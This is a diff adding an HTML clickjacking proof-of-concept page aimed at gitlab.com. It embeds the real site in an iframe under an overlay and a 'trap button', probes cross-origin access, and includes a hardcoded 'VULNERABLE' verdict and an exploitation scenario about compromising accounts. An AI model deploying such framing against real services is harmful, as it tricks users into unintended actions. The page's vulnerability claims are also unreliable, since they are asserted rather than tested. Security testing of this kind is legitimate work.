@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GitLab Clickjacking Test - 2025-12-01</title>
+    <style>
+        body { margin: 0; padding: 20px; font-family: Arial, sans-serif; background: #f5f5f5; }
+        .header { background: #fc6d26; color: white; padding: 20px; text-align: center; }
+        .test-container { position: relative; width: 90%%; max-width: 1200px; height: 600px; margin: 20px auto; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%%; height: 100%%; 
+                    background: rgba(252, 109, 38, 0.1); z-index: 10; 
+                    border: 3px solid #fc6d26; box-sizing: border-box; }
+        .trap-button { position: absolute; top: 150px; left: 200px; z-index: 20; 
+                       padding: 15px 30px; background: #e24329; color: white; 
+                       border: none; font-size: 16px; font-weight: bold; 
+                       cursor: pointer; border-radius: 5px; }
+        iframe { width: 100%%; height: 100%%; border: 2px solid #fc6d26; }
+        .status { margin: 20px; padding: 15px; background: white; border-radius: 5px; }
+        .success { border-left: 5px solid #2ecc71; }
+        .failure { border-left: 5px solid #e74c3c; }
+        .evidence { margin: 20px; padding: 15px; background: white; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎯 GitLab Clickjacking Vulnerability Test</h1>
+        <p>Test Date: 2025-12-01 21:42:17</p>
+        <p>Status: VULNERABLE</p>
+    </div>
+    
+    <div class="status success">
+        <h3>🔍 Vulnerability Status: VULNERABLE</h3>
+        <p>
+            ✅ VULNERABLE: GitLab can be embedded in iframe - Clickjacking possible!
+        </p>
+    </div>
+    
+    <div class="test-container">
+        <div class="overlay"></div>
+        <button class="trap-button">⚠️ TRAP BUTTON</button>
+        <iframe src="https://gitlab.com" 
+                onload="showResult('SUCCESS: GitLab loaded in iframe!')" 
+                onerror="showResult('ERROR: Failed to load GitLab')"></iframe>
+    </div>
+    
+    <div class="evidence">
+        <h3>📊 Evidence Collection:</h3>
+        <ul>
+            <li><strong>Target:</strong> https://gitlab.com</li>
+            <li><strong>X-Frame-Options:</strong> None</li>
+            <li><strong>Content-Security-Policy:</strong> None</li>
+            <li><strong>Test Result:</strong> VULNERABLE</li>
+        </ul>
+        
+        <h3>💥 Exploitation Scenario:</h3>
+        <p>If vulnerable, an attacker can:</p>
+        <ul>
+            <li>Embed GitLab in a malicious website</li>
+            <li>Overlay invisible buttons on GitLab's interface</li>
+            <li>Trick users into performing unintended actions</li>
+            <li>Compromise user accounts and repositories</li>
+        </ul>
+    </div>
+    
+    <script>
+        function showResult(message) {
+            alert(message);
+        }
+        
+        // Additional test: Try to interact with iframe
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                const iframe = document.querySelector('iframe');
+                try {
+                    // Test if we can access iframe content (same-origin check)
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    console.log('Iframe access:', iframeDoc ? 'SUCCESS' : 'BLOCKED');
+                } catch(e) {
+                    console.log('Iframe access blocked by same-origin policy (expected)');
+                }
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
